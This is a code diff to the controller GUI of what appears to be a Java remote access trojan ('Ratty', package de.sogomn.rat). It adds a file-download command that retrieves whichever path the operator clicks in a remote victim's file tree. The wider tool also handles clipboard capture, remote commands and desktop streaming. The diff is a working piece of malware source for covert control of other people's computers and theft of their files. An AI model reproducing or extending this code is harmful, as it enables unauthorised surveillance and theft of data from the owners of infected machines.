@@ -8,6 +8,7 @@ import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.DesktopStreamPacket;
+import de.sogomn.rat.packet.DownloadPacket;
 import de.sogomn.rat.packet.FileSystemPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
@@ -70,6 +71,12 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final FileTreePanel treePanel = serverClient.getTreePanel();
 			final String path = treePanel.getLastPathClicked();
 			final FileSystemPacket packet = new FileSystemPacket(path);
+			
+			return packet;
+		} else if (command == FileTreePanel.DOWNLOAD) {
+			final FileTreePanel treePanel = serverClient.getTreePanel();
+			final String path = treePanel.getLastPathClicked();
+			final DownloadPacket packet = new DownloadPacket(path);
 			
 			return packet;
 		}
